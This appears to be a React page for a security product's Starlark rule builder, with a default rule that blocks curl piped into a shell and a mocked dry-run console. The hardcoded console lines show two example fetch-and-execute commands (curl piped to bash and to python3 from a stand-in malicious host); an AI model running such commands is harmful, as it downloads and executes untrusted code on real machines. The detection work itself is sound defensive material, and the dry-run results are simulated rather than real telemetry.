"use client";

import React, { useState } from 'react';
import Editor from '@monaco-editor/react';
import { PlayCircle, Save, CodeXml, TerminalSquare, RefreshCw } from 'lucide-react';
import { useTenant } from '@/lib/contexts/TenantContext';

const defaultCode = `# AfterSec Starlark Behavioral Rule
# Detects suspicious curl execution dumping to stdout
def on_process_start(ctx):
    if ctx.process.name == "curl":
        args = ctx.process.cmdline
        if "-o" not in args and "-O" not in args:
            # Possible fetch into memory or pipe
            if ctx.process.parent.name in ["bash", "sh", "zsh"]:
                emit_alert("Suspicious curl execution piped directly to shell", severity="high")
                return ACTION_BLOCK
    
    return ACTION_ALLOW
`;

export default function RulesBuilderPage() {
  const { currentTenant } = useTenant();
  const [code, setCode] = useState(defaultCode);
  const [isRunning, setIsRunning] = useState(false);
  const [consoleOutput, setConsoleOutput] = useState<string[]>([
    'Ready. Click "Dry Run" to execute this rule against the last 24h of fleet telemetry.',
  ]);

  const handleDryRun = () => {
    setIsRunning(true);
    setConsoleOutput(prev => [...prev, '\n> Compiling Starlark rule...']);
    
    setTimeout(() => {
      setConsoleOutput(prev => [
        ...prev, 
        '> Compilation successful.',
        '> Ingesting previous 24h telemetry (12,402 events)...',
      ]);
      
      setTimeout(() => {
        setConsoleOutput(prev => [
          ...prev,
          '> [MATCH] pid:8912 | curl http://malicious.io/payload.sh | bash',
          '> [MATCH] pid:1902 | curl -sL https://pastebin.com/raw/XYZ | python3',
          '> Dry run completed in 1.2s.',
          `> Results: 2 anomalous executions found that would be BLOCKED. False positive confidence: Low.`,
        ]);
        setIsRunning(false);
      }, 1500);
    }, 800);
  };

  return (
    <div className="flex flex-col h-screen w-full bg-gray-950 text-gray-200 overflow-hidden">
      {/* Header */}
      <div className="p-4 border-b border-gray-800 bg-gray-900 flex justify-between items-center shrink-0">
        <div>
          <h1 className="text-xl font-bold text-white flex items-center gap-2">
            <CodeXml className="h-6 w-6 text-indigo-400" />
            Starlark Rule Builder
          </h1>
          <p className="text-xs text-gray-400 mt-1">
            Tenant: <span className="text-indigo-400 font-semibold">{currentTenant?.name}</span>
          </p>
        </div>
        <div className="flex gap-3">
          <button 
            onClick={handleDryRun}
            disabled={isRunning}
            className={`px-4 py-2 rounded-lg transition-colors font-semibold text-sm flex items-center gap-2 shadow-lg shadow-indigo-900/20 ${
              isRunning ? 'bg-indigo-600/50 text-indigo-300 cursor-not-allowed' : 'bg-indigo-600 hover:bg-indigo-500 text-white'
            }`}
          >
            {isRunning ? <RefreshCw className="h-4 w-4 animate-spin" /> : <PlayCircle className="h-4 w-4" />}
            {isRunning ? 'Running...' : 'Dry Run'}
          </button>
          <button className="bg-gray-800 hover:bg-gray-700 transition-colors text-white px-4 py-2 rounded-lg text-sm font-semibold flex items-center gap-2">
            <Save className="h-4 w-4" /> Save Rule
          </button>
        </div>
      </div>

      {/* Main Split Pane */}
      <div className="flex-1 flex overflow-hidden">
        {/* Editor Pane */}
        <div className="flex-1 border-r border-gray-800 bg-[#1e1e1e] flex flex-col">
          <div className="bg-[#2d2d2d] border-b border-[#1e1e1e] px-4 py-2 flex text-xs font-mono text-gray-400">
            detect_curl_piping.star
          </div>
          <div className="flex-1">
            <Editor
              height="100%"
              defaultLanguage="python" // Starlark is syntactically python
              theme="vs-dark"
              value={code}
              onChange={(val) => setCode(val || '')}
              options={{
                minimap: { enabled: false },
                fontSize: 14,
                fontFamily: "var(--font-geist-mono), ui-monospace, SFMono-Regular, Consolas",
                lineNumbersMinChars: 3,
                scrollBeyondLastLine: false,
                padding: { top: 16 }
              }}
            />
          </div>
        </div>

        {/* Console Pane */}
        <div className="w-1/3 bg-gray-950 flex flex-col border-l border-gray-800">
          <div className="bg-gray-900 border-b border-gray-800 px-4 py-2 flex items-center gap-2 text-sm font-semibold text-gray-300">
             <TerminalSquare className="h-4 w-4 text-indigo-400" />
             Execution Console Output
          </div>
          <div className="flex-1 p-4 overflow-y-auto font-mono text-xs text-gray-300 whitespace-pre-wrap">
            {consoleOutput.map((line, i) => (
              <div key={i} className={line.includes('[MATCH]') ? 'text-amber-400 font-bold' : line.includes('error') ? 'text-red-400' : ''}>
                {line}
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}
